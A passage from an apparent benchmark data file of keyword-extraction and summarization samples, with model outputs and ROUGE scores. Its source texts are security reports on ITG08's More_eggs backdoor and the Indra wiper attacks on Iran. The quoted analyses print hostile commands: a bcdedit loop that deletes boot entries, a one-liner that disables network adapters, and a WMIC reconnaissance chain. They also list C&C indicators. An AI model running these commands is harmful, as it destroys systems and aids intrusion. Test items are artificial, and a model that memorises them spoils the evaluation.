0.06878306878306878, "gpt3/lexical/rouge_rouge1": 0.4716417910447761, "gpt3/lexical/rouge_rouge2": 0.13813813813813813, "gpt3/lexical/rouge_rougeL": 0.22686567164179103, "gpt3/lexical/rouge_rougeLsum": 0.22686567164179103, "gpt3_generated_text": ["Targeted attack campaigns in enterprise cloud environments have been observed leading to a malware fan-out effect through automated syncing and sharing of files in the cloud. The attackers have been using email addresses of the victims to create synced file names that appear less suspicious and are more likely to be trusted by users. The malware payloads delivered through obfuscated JavaScript have shown variations in both the JavaScript and the final payload, including keyloggers, remote access trojans, and ransomware. Netskope Threat Protection has detected these variations and provided solutions to detect and mitigate the threats in the cloud environment. The attackers have attempted multiple ways to circumvent corporate environments, highlighting the importance of robust security measures in place. By analyzing the behavior and patterns of the malware, organizations can better protect their cloud infrastructure and prevent unauthorized access to their systems."]}, {"split_name": "val", "sample_id": "val_127", "prompt_text": "Extract the keywords: 8/31/2019More_eggs, Anyone? Threat Actor ITG08 Strikes AgainMore_eggs, Anyone? Threat Actor ITG08 Strikes Againsecurityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-againIBM X-Force Incident Response and Intelligence Services (IRIS) responds to security incidents across the globe. During a recent incident response investigation, our team identi\ufb01ed new attacks by the \ufb01nancially motivated attack group ITG08, also known as FIN6.ITG08 is an organized cybercrime gang that has been active since 2015, mostly targeting point- of-sale (POS) machines in brick-and-mortar retailers and companies in the hospitality sector in the U.S. and Europe. More recently, the group has been observed targeting e-commerce environments by injecting malicious code into online checkout pages of compromised websites \u2014 a technique known as online skimming \u2014 thereby stealing payment card data transmitted to the vendor by unsuspecting customers.Based on our investigation and analysis of its adversarial tactics, techniques and procedures (TTPs), we believe ITG08 is actively attacking multinational organizations, targeting speci\ufb01c employees with spear phishing emails advertising fake job advertisements and repeatedly deploying the More_eggs JScript backdoor malware (aka Terra Loader, SpicyOmelette). This tool, a TTP observed in ITG08 attacks since 2018, is sold on the dark web by an underground malware-as-a-service (MaaS) provider. Attackers use it to create, expand and cement their foothold in compromised environments. Past campaigns by ITG08 using the More_eggs backdoor were last reported in February 2019.In the campaign we investigated, the attackers employed additional TTPs historically associated with ITG08, including the use of Windows Management Instrumentation (WMI) to automate the remote execution of PowerShell scripts, PowerShell commands with base64 encoding, and Metasploit and PowerShell to move laterally and deploy malware. Lastly, the attackers used Comodo code-signing certi\ufb01cates several times during the course of the campaign. Many of the above TTPs are not unique to ITG08, but collectively, and with the use of More_eggs, strengthen the link to this group.url Anyone? Threat Actor ITG08 Strikes AgainLet\u2019s take a closer look at ITG08\u2019s TTPs that are relevant to the campaign we investigated, starting with its spear phishing and intrusion tactics and covering information on its use of the More_eggs backdoor. Please note that Visa has attributed the use of this backdoor to FIN6 in attacks that took place in 2018. Further linking the activity with the same threat actor, several of the network indicators and TTPs we encountered in this case \u2014 including the use of fake job advertisements as a lure in spear phishing \u2014 overlap with those reported earlier in 2019 by both Visa and Proofpoint researchers. Analysis of the Intrusion ITG08\u2019s TTPs in compromising targeted organizations follow the typical framework for APT attacks. The following sections go over the steps taken by the attackers to gain an initial foothold and persist on the victimized organization\u2019s networks. Initial Compromise To gain access to victim environments, the threat actor began by targeting handpicked employees using LinkedIn messaging and email, advertising fake jobs to lure recipients into checking into the supposed offers. In one case, we uncovered evidence indicating that the attacker had established communication with a victim via email and convinced them to click on a Google Drive URL purporting to contain an attractive job advert. Once clicked, the URL displayed the message, \u201cOnline preview is not available,\u201d then presented a second URL leading to a compromised or rogue domain, where the victim could download the payload under the guise of a job description:Figure 1: Link provided in spear phishing email to an employeeThat URL, in turn, downloaded a ZIP \ufb01le containing a malicious Windows Script File (WSF) that initiated the infection routine of the More_eggs backdoor:url Anyone? Threat Actor ITG08 Strikes AgainFigure 2: Final landing page that downloads a malicious \ufb01leBased on \ufb01le system artifacts examined during our investigation, the ZIP \ufb01le and WSF \ufb01les were deleted upon a successful malware infection, likely in an attempt to prevent researchers from recovering the original \ufb01les from the \ufb01lesystem. The \ufb01lesystem, however, contained evidence of a nonmalicious decoy document dropped to the disk drive during the spear phishing attacks. Gaining a Foothold The spear phishing attacks unfortunately led to initial compromise and the installation of the More_eggs JScript backdoor, which established a reverse shell connection to the attacker\u2019s command-and-control (C&C) infrastructure. Additional capabilities of the More_eggs malware include the download and execution of \ufb01les and scripts and running commands using cmd.exe.X-Force IRIS determined that the More_eggs backdoor later downloaded additional \ufb01les, including a signed binary shellcode loader and a signed Dynamic Link Library (DLL), as described below, to create a reverse shell and connect to a remote host. The shellcode loader was observed on one infected device as updater.exe with the Metasploit-style service name APTYnDS1ABEuUHEA, indicating that it was installed as a service. Reconnaissance, Lateral Movement and Privilege Escalation Once the attackers established a foothold on the network, they employed WMI and PowerShell techniques to perform network reconnaissance and move laterally within the environment. This type of method, called living off the land, can often blend with legitimate system administration activities, which can make it challenging for security controls to detect.The attackers used this technique to remotely install a Metasploit reverse TCP stager on select systems, subsequently spawning a Meterpreter session and Mimikatz. Meterpreter is a payload component in the Metasploit Framework that uses in-memory DLL injection, which can lead to a compromise by malware or any malicious code/commands. Mimikatz is a post-exploitation tool that allows attackers to extract credentials from volatile memory. Stolen credentials are usually leveraged to facilitate privilege escalation and further lateral movement through the compromised environmenturl Anyone? Threat Actor ITG08 Strikes AgainOnce the Metasploit reverse TCP stager executed, it downloaded and loaded a second stage Meterpreter DLL into memory, allowing the attacker to spawn a Meterpreter session via a handler and initiate the loading of extensions, such as Mimikatz. In addition to the More_eggs malware, the attacker leveraged in-memory attacks by injecting malicious code, in this case Mimikatz, into legitimate system processes. Establishing Persistence To cement their foothold and add persistence throughout the compromised environment, X-Force IRIS uncovered evidence that the attacker had selected several additional devices on which to install the More_eggs backdoor, creating redundancy in ways to get back into the network. ITG08 remotely connected to these devices using PowerShell and WMI and downloaded and executed a DLL \ufb01le, subsequently installing More_eggs on the device without dropping the nonmalicious decoy document. More_eggs: Malware AnalysisITG08 Leveraging a Malware-as-a-Service Provider A recently rising attack tool in ITG08 campaigns has been the More_eggs JScript backdoor. But while it was recently identi\ufb01ed with ITG08 activity, the More_eggs backdoor is apparently developed and sold through an underground MaaS provider. This vendor not only supplies the backdoor malware, but also offers related technical services, such as preparing the network infrastructure to download More_eggs-related \ufb01les and furnishing resources for C&C purposes.In addition to More_eggs, the same underground vendor is also responsible for producing the signed DLL described below, which creates a reverse shell (ReverseShell Executable). We based this assessment on code similarities between the DLL and other samples created by the same vendor, including the DLL that drops the More_eggs backdoor.url Anyone? Threat Actor ITG08 Strikes AgainFigure 3: Network indicators revealing the use of an underground MaaS vendor selling More_eggs and malicious infrastructure services The More_eggs Dropper DLL After a successful phishing attack in which users have opened emails and browsed to malicious links, ITG08 attackers install the More_eggs JScript backdoor on user devices alongside several other malware components.The process begins with the consistent execution of a malicious DLL using the legitimate regsvr32.exe Windows Utility. Once executed, the DLL is deleted from the system and its components are dropped to the system.Before being deleted, the DLL executes a string decoding routine that is designed to execute for about a minute, spiking central processing unit (CPU) usage for the regsvr32.exe process. Once the strings are decoded, the More_eggs components are decrypted, dropped to the system (normally in the %APPDATA%\\Microsoft\\ or %ProgramData%\\Microsoft\\ directories) and executed.The observed strings appearing like HEX-encoded strings are shown below:url Anyone? Threat Actor ITG08 Strikes AgainFigure 4: Sample encoded and decoded strings More_eggs Components The More_eggs dropper DLL creates the following components on the infected device (further detail on each component in the chart follows in the next section):Sample File Name 5795C3AC7F57F.txtDescription An XSL stylesheet \ufb01le that contains an obfuscated More_eggs JScript loader.625222E09B6CD028459.txt Benign XML document occasionally used as a parameter when exe\u201027603.docxA70613FF7F5DE98.txtmsxsl.executing the msxsl.exe utility. Benign Word Document decoy. The Decoy was not always dropped in the executions of the DLLs analyzed. Obfuscated script \ufb01le that executes msxsl.exe with the appropriate parameters as arguments. Once the script executes, the More_eggs JScript is loaded into the memory space of msxsl.exe. Benign Microsoft Command Line Transformation Utility known to be used to execute malicious code and bypass application whitelisting.Figure 5: Components created by DLLmsxsl.exe is executed by the script \ufb01le A70613FF7F5DE98.txt, which is obfuscated as shown below:Figure 6: Obfuscated script \ufb01le A70613FF7F5DE98.txtThe use of msxsl.exe is a known tactic to execute malicious code and bypass application whitelisting. The deobfuscated command is built as follows:\u201cC:\\Users\\<username>\\AppData\\Roaming\\Microsoft\\msxsl.exe\u201d \u201cC:\\Users\\ <username>\\AppData\\Roaming\\Microsoft\\625222E09B6CD028459.txt\u201d \u201cC:\\Users\\ <username>\\AppData\\Roaming\\Microsoft\\5795C3AC7F57F.txt\u201durl Anyone? Threat Actor ITG08 Strikes AgainOnce the above command is executed, the More_eggs JScript loader 5795C3AC7F57F.txt will deobfuscate the embedded More_eggs JScript. A sample loader is shown below.The start of the XSL \ufb01le:Figure 7: JScript loader sampleThe end of the XSL \ufb01le:Figure 8: JScript loader sampleThe \u201cselect\u201d value within the template tag points to the function in the msxsl:script tag, which will execute when the msxsl.exe command is run. The JScript loader \ufb01le is highly obfuscated and decodes the More_eggs backdoor in a variety of ways, including RC4 decryption. Analyzing the More_eggs JScript Backdoor The analysis in this section details the functionality of More_eggs backdoor samples speci\ufb01c to this investigation, so please bear in mind that the same malware can be deployed differently in other campaigns and by alternate attackers.The core functionality of the samples analyzed in this campaign remained the same as described by previous researchers. We aimed to add additional detail about the inner workings of the malware, including its C&C communications \ufb02ow, its \ufb01lesystem activity, and some encryption and encoding schemes used by the samples we analyzed.The More_eggs backdoor is executed entirely in memory, never touching the \ufb01lesystem in an unencrypted state. Notable con\ufb01guration data is hardcoded and includes its C&C server address, malware version number and an Rkey value, which is believed to identify campaign perpetrators to the vendor:The Rkey value is appended with a two-byte, pseudorandomly generated string used to construct an RC4 key. The Rkey variable is part of the ciphering key used to encrypt C&C communications. The RC4 key is then used to encrypt data, which is additionally basE91 encoded and sent back to the C&C. BasE91 is a method for encoding binary as ASCII characters.url Anyone? Threat Actor ITG08 Strikes AgainUpon initial execution, the backdoor checks its environment to determine whether it is running with administrative or user privileges, and if proper components are present on the system. To check the user\u2019s privilege level on the newly infected device, it attempts to read the registry key HKEY_USERS\\S-1-5-19\\Environment\\TEMP; a successful read means it is running with administrative privileges, and the backdoor builds the path %ProgramData%\\Microsoft. If it is not running with administrative privileges, the path %AppData%\\Microsoft is used.The More_eggs backdoor obtains the username and computer name of the infected device, and if running with privileges, it reads the following registry key: HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Notepad\\<computername>. If not running with privileges, it reads the key HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Notepad\\ <username> instead.The data in these Windows registry keys is expected to be a comma-separated list of \ufb01les with no extension. The .txt extension is appended to the name by the backdoor. If these \ufb01les exist along with msxsl.exe in the proper location, either %ProgramData%\\Microsoft or %AppData%\\Microsoft, the malware\u2019s execution continues.Once the environment is checked, the backdoor will check for network connectivity by sending an HTTP GET request to hxxp://www.w3[.]org/1999/XSL/Format, ensuring the response is \u201cThis is another XSL namespace\\n.\u201dGET /1999/XSL/Format HTTP/1.1 Accept: */* Accept-Language: en-us UA-CPU: [CPU version] Accept-Encoding: gzip, de\ufb02ate User-Agent: [User agent string here] Host: www.w3.org Connection: Keep-Alive,Figure 9: HTTP GET requestIf the connection is successful, the backdoor builds a string formatted with \u201c|<random-value>|\u201d. The random value is between 8 and 32 bytes long, RC4-encrypted, basE91 encoded, and subsequently sent to the C&C in an HTTP POST request.The RC4 key used is generated from the Rkey variable value:POST HTTP/1.1 Connection: Keep-Alive Accept: */* Accept-Language: en-us User-Agent: [User agent string] Content-Length: 36 Host: 6R+#9fWCy)htQSo4:H9&JSMTx|X[OEKj^gXEFigure 10: HTTP POST requestThe C&C response is expected to be between 8 and 32 bytes long, nothing is done with the server response. The random value acts as a handshake between the backdoor and the C&C, pseudorandom 8 to 32-byte URI.url Anyone? Threat Actor ITG08 Strikes AgainGET /avIRga9sfvjGj3HCPGlgzaBXOof3u7wq HTTP/1.1 Connection: Keep-Alive Accept: */* Accept-Language: en-us User-Agent: [User agent string] infected device using a series of WMIC commands.\u201c%comspec% /c wmic path win32_Operatingsystem get SerialNumber /FORMAT:Textvaluelist | \ufb01nd\u2010 str /R /C:\\\u201dSerialNumber=\\\u201d > \\\u201dC:\\\\Users\\\\mal_re\\\\AppData\\\\Local\\\\Temp\\\\12025.txt\\\u201d & vol %HOMEDRIVE% > \\\u201dC:\\\\Users\\\\mal_re\\\\AppData\\\\Local\\\\Temp\\\\50573.txt\\\u201d & wmic csproduct get Name /FORMAT:Textvaluelist | \ufb01ndstr /R /C:\\\u201dName=\\\u201d > \\\u201dC:\\\\Users\\\\mal_re\\\\AppData\\\\Local\\\\Temp\\\\58678.txt\\\u201d & tasklist /FO CSV /NH > \\\u201dC:\\\\Users\\\\mal_re\\\\AppData\\\\Local\\\\Temp\\\\39054.txt\\\u201d & ver > \\\u201dC:\\\\Users\\\\mal_re\\\\AppData\\\\Local\\\\Temp\\\\28535.txt\\\u201d & wmic os get ProductType /FORMAT:Textvaluelist | \ufb01ndstr /R /C:\\\u201dProductType=\\\u201d > \\\u201dC:\\\\Users\\\\mal_re\\\\AppData\\\\Local\\\\Temp\\\\4140.txt\\\u201d & ipcon\ufb01g | \ufb01ndstr /R /C:\\\u201dIPv4 Address\\\u201d > \\\u201dC:\\\\Users\\\\mal_re\\\\AppData\\\\Local\\\\Temp\\\\65390.txt\\\u201d\u201dFigure 12: System information collectionThe infected device\u2019s system information is written to several %Temp%\\<random-\ufb01lenames>.txt \ufb01les. The contents of the \ufb01les are read and then the \ufb01les themselves are deleted.The More_eggs backdoor accepts the following commands from its remote operator:CommandDescriptiond&execDownload and execute an executable (.exe or .dll).more_eggsDelete the current More_eggs and replace it.GtfoUninstall activity.more_onion Execute a script.via_cRun a command using \u201ccmd.exe /C\u201d.Figure 13: More_eggs commands Meterpreter Reverse TCP Stagers Beyond using More_eggs as a backdoor, the attackers in this campaign also used offensive security tools and PowerShell scripts to carry out the different stages of the attack.url Anyone? Threat Actor ITG08 Strikes AgainThe PowerShell scripts analyzed during our investigation contained Metasploit Reverse TCP stagers. These stagers were used to execute shellcode that connected back to an attacker\u2019s server and injected Meterpreter components, such as Mimikatz, into the memory space of legitimate processes. After injecting Meterpreter into memory, the attacker had complete control of the infected device.The reverse TCP PowerShell stagers functioned as follows:1. The reverse TCP PowerShell stagers were obfuscated with base64 encoding and GZipcompression. This encoding scheme is standard for Meterpreter PowerShell stagers. The original command contained a base64-encoded loader script.2. The loader script base64 decodes, Gzip decompresses and executes a MetasploitPowerShell re\ufb02ection payload in memory.3. The re\ufb02ection payload base64 decodes a Meterpreter reverse TCP shellcode, injects it intomemory using .NET re\ufb02ection methods and executes the decoded shellcode.4. The shellcode connects back to the attacker\u2019s server. Meterpreter components, such as thecore module and metsvr.dll, and extensions, such as Mimikatz, are injected into the memory space of a legitimate process.Figure 14: Original commandFigure 15: Decoded loaderFigure 16: Decoded re\ufb02ection payload Metasploit Shellcode Loader As our analysis continued, X-Force IRIS found a UPX-packed Metasploit shellcode loader (49340.txt) during the forensic investigation of compromised devices. This loader attempted to masquerade as the Apache Bench application and notably contained metadata and project paths (.PDB), indicating that it may be attempting to masquerade as other applications as well, a rather typical behavior for malicious binaries.The shellcode was loaded into memory and designed to receive an RC4-encrypted buffer, which was decrypted and executed in memory. The sample also contained a Comodo code-signing certi\ufb01cate issued to \u201cMAHTEM LTD,\u201d which we believe is one of a number of fake companies established to purchase the certi\ufb01cates.The sample we analyzed further contained \ufb01ve binary entries in a resource named \u201cREGISTRY\u201d \u2014 35, 224, 409, 3908 and 4994 \u2014 each containing some obfuscated shellcode.Once loaded into memory, the shellcode connected back to a remote host, receiving 4 bytes in return. Those were XORed with the string 0xad350bdd and had 0x100 added to it. This value was then used as the size speci\ufb01cation for the next received buffer, which was RC4-decrypted with the resulting 16-byte key and executed in memory. A ReverseShell Executable Yet another tool in the attackers\u2019 arsenal for this campaign was a DLL backdoor executable that X-Force IRIS found during the investigation. When executed via its DllRegisterServer export function, the DLL connected to a remote host on port 443 and created a reverse shell. In this investigation, the DLL connected to 185[.]204[.]2[.]182 and contained a Comodo code-signing certi\ufb01cate issued to \u201cD Bacte Ltd.\u201durl Anyone? Threat Actor ITG08 Strikes AgainITG08 Attacks Organizations for Financial Gain ITG08 has been around for over four years now. Its attacks are \ufb01nancially motivated, sophisticated and persistent. The group historically has specialized in stealing payment card data from POS machines and has more recently expanded operations to target card-not-present data from online transactions. To follow information about ITG08 as it emerges, please join us on X- Effective network defense and threat intelligence rely on multiple factors, such as knowing the network\u2019s attack surface, understanding the threat actor\u2019s motivations and TTPs, and the skill and knowledge of the security team that enable it to identify malicious behavior.IBM X-Force IRIS has gained insight into ITG08\u2019s intrusion methods, ability to navigate laterally, use of custom and open-source tools, and typical persistence mechanisms. Our team has provided the following mitigation tips for defenders who are looking out for attacks by this group. Educate Users About Email X-Force IRIS determined that the ITG08 compromise was the result of a phishing email in which the initial compromise was made possible by a victim who clicked on a malicious attachment. Role-based security awareness training should be at the top of the list of any organization\u2019s mitigation strategies to help employees recognize phishing emails and possible malicious attachments, and to educate them about their security responsibilities with regards to reporting potentially malicious emails. Search for Known IoCs After the phishing email resulted in a successful in\ufb01ltration, ITG08 used the More_eggs backdoor to gain a foothold and infect additional devices. More_eggs-related artifacts such as the DLL dropper have extremely low antivirus (AV) detection rates, based on analysis conducted via VirusTotal (VT). For example, a More_eggs DLL dropper submitted to VT on April 18, 2019 had a detection rate of only 5 percent.To detect this malware, critical events should be analyzed based on the attacker\u2019s patterns. SYSMON or an endpoint detection and response tool should be con\ufb01gured to detect the combined use of msxsl.exe and WMI. In addition, Registry keys and scheduled tasks should be analyzed for indications of persistence. The network should also be scrutinized for any privilege escalation events and any signs of internal reconnaissance. YARA signatures should also be created to assist security personnel in detecting the More_eggs malware. YARA signatures for X- Force IRIS premium subscribers can be provided on request. Analyze Logs Other mitigation strategies against this type of activity include analyzing host-based \ufb01rewall logs for internal pivoting, unauthorized listening executables and scanning activity. In addition, con\ufb01guring PowerShell script logging and identifying any obfuscation will assist in mitigating ITG08\u2019s use of PowerShell to conduct malicious activity. ITG08 has also demonstrated the use of stolen credentials; therefore, multiple failed login attempts and/or unauthorized account usage may be indicators of ITG08 activity on a network.url Anyone? Threat Actor ITG08 Strikes AgainMonitor for Remote Services X-Force IRIS also recommends taking steps to prevent lateral movement. Although lateral movement can be dif\ufb01cult to detect, a spike in usage of Windows tools, such as remote administration services (PowerShell Remoting and WMI), should be monitored. Detection and monitoring capabilities should be in place and network defenders should be familiar with what is considered a \u201cnormal\u201d baseline on their user network. Without a baseline of \u201cnormal\u201d activity, the use of Windows tools may blend in with legitimate activity, which can allow attackers to continue to live off the land unnoticed. Rethink Network Architecture Security defenders should examine network architecture to see how the network is segregated, what Windows tools are restricted or used by administrators, and what alerts are set up to warrant personnel review. Least privilege principals should be implemented for all users on the network, and a strong password management system with two-factor authentication and password expiration dates should be deployed as an additional layer of security. Pen Test! Organizations looking to limit the ways by which attackers can in\ufb01ltrate their networks should be mindful of ongoing patching of vulnerabilities. After reaching maturity on the vulnerability assessment front, mitigation strategies should also include penetration testing to \ufb01nd unknown vulnerabilities related to people, software and hardware used on the organization\u2019s critical assets and externally facing resources. Incident Response Nowadays, no organization can be exempt from planning and drilling incident response plans in the face of potential security incidents. Conducting tabletop exercises and regularly drilling plans can help organizations proactively prepare and take control of an incident if ever one should occur.For additional resources and information, please check out X-Force IRIS. If you believe your organization may be under attack, please call the X-Force Emergency Response Hotline at 888- 241-9812. Appendix A: IoCs More_eggs C&C domains:api[.]cloudservers[.]kz mail[.]rediffmail[.]kz secure[.]cloudserv[.]ink metric[.]onlinefonts[.]kz news[.]bradpitt[.]kzLanding page domains (downloads \ufb01les):url\ufb01ng[.]services usstaf\ufb01ng[.]services jobhyper[.]com12/138/31/2019More_eggs, Anyone? Threat Actor ITG08 Strikes AgainMeterpreter C&C IP addresses:185[.]162[.]128[.]70*. 185[.]243[.]115[.]50 192[.]99[.]20[.]90 192[.]187[.]103[.]42 Cyber Threat Hunt Analyst, IBM SecurityOle Villadsen is an analyst on the Threat Hunt & Discovery Team within IBM X-Force Incident Response and Intelligence Services (IRIS), where he investiga read moreurl ", "generated_text": "IBM X-Force Incident Response and Intelligence Services; IRIS; a new attack; the financially motivated attack group; ITG08; FIN6; 2015; point-of-sale; POS machines; retailers; companies; the hospitality sector; Europe; spear; emails; fake job advertisements; the More_eggs backdoor; Terra Loader; SpicyOmelette; Windows Management Instrumentation; WMI; Metasploit; PowerShell scripts; PowerShell commands; Metasploit; Comodo code-signing certificates; the campaign; Targeted Organizations; individuals; targets; LinkedIn; credentials; POS systems; Chrome; system info; the same threat actor; 2017; Download; a malware; The group; POS machines; POS sites; threat actors; infrastructure; attacks; 2017; new attacks; time; ITG08 targets.", "ref_text": "<START-1>The PDF describes an investigation by IBM X-Force Incident Response and Intelligence Services (IRIS) into recent attacks by the financially motivated cybercrime group ITG08 (also known as FIN6). ITG08 has been active since 2015 targeting point-of-sale systems and hospitality companies in the US and Europe. The investigation found ITG08 used spear phishing emails with fake job ads to target specific employees and trick them into downloading malware. The main malware used was More_eggs, a backdoor sold on the dark web. Other tools included Metasploit for lateral movement and signed binaries and DLLs to establish persistence. Once initial access was gained, ITG08 moved laterally with Windows tools like WMI and PowerShell. They escalated privileges using Mimikatz and harvested credentials. The group also made heavy use of obfuscation techniques like base64 encoding. Based on the TTPs observed, IBM assesses with high confidence that ITG08 was behind this new campaign. The use of More_eggs and fake job ads links it to previous ITG08 activity reported in 2018-2019. The group continues to evolve, expanding from POS malware to card-not-present fraud. Mitigation tips include user education on phishing, monitoring for ITG08 IOCs and TTPs, controlling Windows tools often abused by attackers, and implementing strong password policies and 2FA. Regular pen testing and incident response exercises also help strengthen defenses. <END-1>", "t5/keyword/hint_hit_precision": 0.32653061224489793, "t5/word/hint_hit_recall": 0.10747663551401869, "gpt3/lexical/rouge_rouge1": 0.5217391304347827, "gpt3/lexical/rouge_rouge2": 0.19023136246786632, "gpt3/lexical/rouge_rougeL": 0.3427109974424553, "gpt3/lexical/rouge_rougeLsum": 0.3427109974424553, "gpt3_generated_text": ["IBM X-Force Incident Response and Intelligence Services (IRIS) recently identified a new attack by the financially motivated attack group ITG08, also known as FIN6. Since 2015, ITG08 has been targeting point-of-sale (POS) machines in retailers and companies in the hospitality sector in the U.S. and Europe. More recently, they have been targeting e-commerce environments through online skimming. The group has been observed targeting multinational organizations by sending spear phishing emails advertising fake job advertisements and deploying the More_eggs JScript backdoor malware. The attackers used various tactics, including Windows Management Instrumentation (WMI) to automate the remote execution of PowerShell scripts, Metasploit, and Comodo code-signing certificates. The attackers gain initial access to victim environments by targeting employees through LinkedIn messaging and email, convincing them to click on malicious links that initiate the infection routine of the More_eggs backdoor. This campaign by ITG08 reinforces their link to previous attacks reported in 2018 and 2019, showcasing their persistence and evolving tactics in compromising targeted organizations."]}, {"split_name": "val", "sample_id": "val_128", "prompt_text": "Extract the keywords: 8/16/2021Indra \u2014 Hackers Behind Recent Attacks on Iran - Check Point ResearchIndra \u2014 Hackers Behind Recent Attacks on Iranresearch.checkpoint.com/2021/indra-hackers-behind-recent-attacks-on-iranAugust 14, 2021August 14, 2021IntroductionThese days, when we think of nation-state level damage, we immediately think of the nation-state level actor that must be responsible for it. While most attacks against a nation\u2019s sensitive networks are indeed the work of other governments, the truth is that there is no magic shield that prevents a non-state sponsored entity from creating the same kind of havoc, and harming critical infrastructure in order to make a statement.In this piece, we present an analysis of a successful politically motivated attack on Iranian infrastructure that is suspected to be carried by a non-state sponsored actor. This specific attack happened to be directed at Iran, but it could as easily have happened in New York or Berlin. We\u2019ll look at some of the technical details and expose the actor behind the attack \u2014 thereby linking it to several other politically motivated attacks from earlier years.Key FindingsOn July 9th and 10th, 2021 Iranian Railways and the Ministry of Roads and Urban Development systems became the subject of targeted cyber attacks. Check Point Research investigated these attacks and found multiple evidence that these attacks heavily rely on the attacker\u2019s previous knowledge and reconnaissance of the targeted networks. The attacks on Iran were found to be tactically and technically similar to previous activity against multiple private companies in Syria which was carried at least since 2019. We were able to tie this activity to a threat group that identify themselves as regime opposition group, named Indra.url \u2014 Hackers Behind Recent Attacks on Iran - Check Point ResearchDuring these years, the attackers developed and deployed within victims\u2019 networks at least 3 different versions of the wiper dubbed Meteor, Stardust, and Comet. Judging by the quality of the tools, their modus operandi, and their presence on social media, we find it unlikely that Indra is operated by a nation-state actor. A technical analysis of the tools, as well as the TTPs used by the underlying actor, are thoroughly described in this article. We share with the public Yara rules and a full list of indicators of compromise.On Friday, July 9th, Iran\u2019s railway infrastructure came under cyber-attack. According to Iranian news reports, hackers displayed messages about train delays or cancellations on information boards at stations across the country, and urged passengers to call a certain phone number for further information. This number apparently belongs to the office of the country\u2019s supreme leader, Ayatollah Ali Khamenei.\u201cLong delays due to cyber attacks. More information: 64411\u201d message containing the Supreme Leader officenumber displayed on Iran\u2019s railways\u2019 stations boards. Image published by the media.url \u2014 Hackers Behind Recent Attacks on Iran - Check Point ResearchThe very next day, July 10th, websites of Iran\u2019s Ministry of Roads and Urbanization reportedly went out of service after another \u201ccyber-disruption\u201d. Iranian social media spread the photos of a monitor of one of the hacked computers, where the attackers took responsibility for both consecutive attacks.\u201cWe attacked the computer systems of the Railway Company and the Ministry of Roadsand Urban Development\u201d. The message left by attackers on hacked machinesA few days later, Iranian cybersecurity company Amnpardaz Software published a short technical analysis of a piece of malware supposedly related to these attacks, dubbed Trojan.Win32.BreakWin . Based on the information published, Check Point Research Team retrieved the files from publicly available resources and conducted a thorough investigation of them. The findings shared in this report were reviewed and evaluated by journalists and fellow researchers from other security vendors. During this time, SentinelOne released a report based on Amnpardaz\u2019s analysis.In this article, we first analyze the artifacts left by these attacks. Based on this analysis, we uncover a set of similar tools previously used in other operations during 2019-2020: carried against multiple targets in Syria, they did not attract much public attention at the time. We then share some insights into the tactics, techniques, and procedures (TTPs) of the underlying actor, which self-identifies as \u201cIndra\u201d and, according to some Iranian sources, may have ties to hacktivist or cybercriminal groups.Hunting for the files from the Iranian hackWith Amnpardaz\u2019s threat database as our starting point, we searched for files with similar names and functionality. The search led us to dozens of files, all uploaded from the same two sources located in Iran. Even though we weren\u2019t able to find all the mentioned artifacts, we recovered most of the execution flow as described in Amnpardaz\u2019s report.The execution flow is heavily based on multiple layers of archives and Batch scripts. When detonated, they:url \u2014 Hackers Behind Recent Attacks on Iran - Check Point ResearchAttempt to evade anti-virus detection Destroy the boot configuration data Run the final payloads that aim to lock and completely wipe the computers in the network.The execution flow of the attacks against targets in IranThe execution starts with pushing a scheduled task from the AD to all the machines via group policy. The task name is Microsoft\\Windows\\Power Efficiency Diagnostics\\AnalyzeAll and it mimics the AnalyzeSystem task performed by Windows Power Efficiency Diagnostics report tool. The subsequent chain of .bat files and archives is intended to perform the following operations:Filter the target machines: setup.bat first checks if the hostname of the machine is one of the following: PIS-APP , PIS-MOB , WSUSPROXY or PIS-DB . If so, it stops the execution and deletes the folder containing the malicious script from this machine. PIS in the hostnames stands for Passenger Information System, which is usually responsible among others for updating the platform boards with actual data, so attackers made sure their message to the Iranian public will be displayed properly. Download the malicious files onto the machine: the same batch file downloads a cab archive named env.cab from a remote address in the internal network: \\\\railways.ir\\sysvol\\railways.ir\\scripts\\env.cab . The use of specific hostnames and internal paths indicates the attacker had prior knowledge of the environment. Extract and run additional tools: update.bat , which was extracted and started by setup.bat , uses the password hackemall to extract the next stages: cache.bat , msrun.bat and bcd.bat . Disconnect the machine from all networks: the cache.bat script disables all the network adapters on the machine with the following command: powershell -Command \"Get-WmiObject - class Win32_NetworkAdapter | ForEach { If ($.NetEnabled) { $.Disable() } }\" > NUL Perform Anti-AV checks: the same cache.bat script also checks if Kaspersky Antivirus is installed on the machine and if not, it adds all the files and folders related to the attack to the Windows Defender exclusion list and proceeds with the execution.url \u2014 Hackers Behind Recent Attacks on Iran - Check Point ResearchCorrupt the boot: bcd.bat is used in order to harm the boot process. First, it tries to override the boot file with new content and then deletes the different boot identifiers using Windows built-in BCDEdit tool: for /F \"tokens=2\" %%j in ('%comspec% /c \"bcdedit -v | findstr identifier\"') do bcdedit /delete %%j /f Remove all the traces: the same bcd.bat in addition to boot override also removes Security, System and Application Event Viewer logs from the system using wevtutil. Unleash the main payload: The msrun.bat script is responsible for unleashing the Wiper. It moves wiper-related files to \u201cC:\\temp\u201d and creates a scheduled task named mstask to execute the wiper only once at 23:55:00.Analysis of the main payload \u2014 The WiperThe main payload of the attack is an executable named msapp.exe , and its purpose is to take the victim machine out of service by locking it and wiping its contents. Upon execution, the malware hides this executable\u2019s console window to decrease the suspicion of vigilant victims.Wiper configuration fileThe wiper will refuse to function unless it is provided a path to an encrypted configuration file msconf.conf as a command-line argument. The configuration file allows some degree of flexibility during the execution of the payload and gives the attacker the ability to tailor the attack to specific victims and systems. A helper script to decrypt the configuration file is available in Appendix C.The configuration format used supports multiple fields, which jointly hint at this binary\u2019s role in the attack.Supported Configuration Fieldsauto_logon_pathlog_file_pathcleanup_scheduled_task_namelog_server_ipcleanup_script_pathis_alive_loop_intervallog_server_portpaths_to_wipelocker_background_image_jpg_pathprocess_termination_timeoutlocker_background_image_bmp_path processes_to_killlocker_exe_pathlocker_installer_pathself_scheduled_task_namestate_encryption_keylocker_password_hashstate_pathlocker_registry_settings_filesusers_passwordlog_encryption_keywiping_stage_logger_intervalNot all these fields were actually used in the configuration file of the wiper targeting the Iranian networks, which might suggest that the tool was not created specifically for this attack (or otherwise, that its design fell victim to premature optimization).If the configuration is parsed successfully, the program writes the string \"Meteor has started.\" to an encrypted log file, suggesting that the internal name of the malware is \u201c Meteor \u201c. As we will see later on in this article, another name was used in previous attacks. Throughout the entire execution of the malware, it keeps logging its 